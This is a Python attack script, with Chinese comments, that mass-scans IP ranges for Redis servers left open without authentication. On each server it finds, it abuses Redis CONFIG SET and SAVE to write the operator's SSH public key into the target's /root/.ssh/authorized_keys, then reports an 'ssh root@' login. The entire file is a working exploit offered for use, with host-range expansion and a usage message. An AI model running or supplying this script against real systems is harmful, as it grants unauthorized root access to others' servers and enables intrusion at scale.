# coding=utf-8
"""
DATE:   2021/7/7
AUTHOR: TesterCC
"""

import getopt
import json
import sys
import optparse
import os
import platform
import redis
import time
import socket
import uuid

"""
Redis未授权访问提权武器

# 读取本地SSH public key
# 探测IP的Redis是否可用
# 尝试对未授权Redis进行SSH key写入

# pip install -i https://pypi.tuna.tsinghua.edu.cn/simple redis
"""

ret = dict()
ret['status'] = None
ret['info'] = None


def get_local_ssh_key():
    # 根据操作系统决定默认路径
    if platform.system() == 'Windows':

        win_userprofile = os.popen("echo %USERPROFILE%").read()

        win_userprofile = str(win_userprofile).replace("\n", "").replace("\\", "/")

        default_public_key_path = win_userprofile + "/.ssh/id_rsa.pub"

    else:
        default_public_key_path = r"/root/.ssh/id_rsa.pub"

    public_key_path = default_public_key_path

    with open(public_key_path, 'r') as file_key:
        public_key = file_key.read()

    return public_key


def write_ssh_key(ip, port="6379"):
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(1)
    try:
        sk.connect((ip, 22))
        sk.close()
    except Exception:
        ret['status'] = 'fail'
        ret['info'] = 'SSH is closed'

    try:
        r = redis.StrictRedis(host=ip, port=port, db=0, socket_timeout=0.3)

        public_key = get_local_ssh_key()

        key = str(uuid.uuid1())  # 生成一个随机的key写入
        r.set(key, '\n\n{}\n\n'.format(public_key))
        r.config_set('dir', '/root/.ssh')  # 如果redis在非root下运行会抛出异常
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        r.delete(key)
        r.config_set('dir', '/tmp')
        time.sleep(1)

        ret['status'] = 'success'
        ret['info'] = dict()
        ret['info'] = {
            "shell_type": "SSH",
            "ip": ip,
            "usage": "ssh root@{}".format(ip)
        }
    except Exception as err:
        ret['status'] = 'fail'
        ret['info'] = str(err)


def redis_unauthored(url, port):
    result = dict()
    s = socket.socket()

    payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
    socket.setdefaulttimeout(10)
    for ip in url:
        try:
            s.connect((ip, int(port)))
            s.sendall(payload.encode())
            recvdata = s.recv(1024).decode()
            if recvdata and 'redis_version' in recvdata:
                result = {str(ip): str(port)}

                # 调用写ssh key的逻辑
                write_ssh_key(str(ip), port)

        except Exception as err:

            ret['status'] = 'fail'
            ret['info'] = str(err)
        s.close()
    return result


def url_list(li):
    ss = []
    i = 0
    j = 0
    zi = []
    for s in li:
        a = s.find('-')
        i = i + 1
        if a != -1:
            ss = s.rsplit("-")
            j = i
            break
    for s in range(int(ss[0]), int(ss[1]) + 1):
        li[j - 1] = str(s)
        aa = ".".join(li)
        zi.append(aa)
    return zi


# 执行url
def url_exec(url):
    i = 0
    zi = []
    group = []
    group1 = []
    group2 = []
    li = url.split(".")
    if (url.find('-') == -1):
        group.append(url)
        zi = group
    else:
        for s in li:
            a = s.find('-')
            if a != -1:
                i = i + 1
        zi = url_list(li)
        if i > 1:
            for li in zi:
                zz = url_list(li.split("."))
                for ki in zz:
                    group.append(ki)
            zi = group
            i = i - 1
        if i > 1:
            for li in zi:
                zzz = url_list(li.split("."))
                for ki in zzz:
                    group1.append(ki)
            zi = group1
            i = i - 1
        if i > 1:
            for li in zi:
                zzzz = url_list(li.split("."))
                for ki in zzzz:
                    group2.append(ki)
            zi = group2
    return zi


def start_attack(ip, port):
    result = redis_unauthored(url_exec(ip), port)
    # print(">>>", result)
    return result


def main():
    parser = optparse.OptionParser('usage: \npython %prog --ip 10.0.4.159 --port 6379\n\n'
                                   '请先确认本机 ~/root/.ssh/ 目录下有 id_rsa.pub 公钥文件，若没有，执行 ssh-keygen -t rsa 生成。\n攻击成功后，使用 ssh root@x.x.x.x 连接目标，可正常登录目标机即为成功')
    parser.add_option('-i', '--ip', dest='attack_ip', default='1.1.1.1', type='string', help='host ip')
    parser.add_option('-p', '--port', dest='attack_port', default='6379', type='string', help='host port')
    options, args = parser.parse_args()

    start_attack(options.attack_ip, options.attack_port)
    print(json.dumps(ret))


if __name__ == '__main__':
    main()
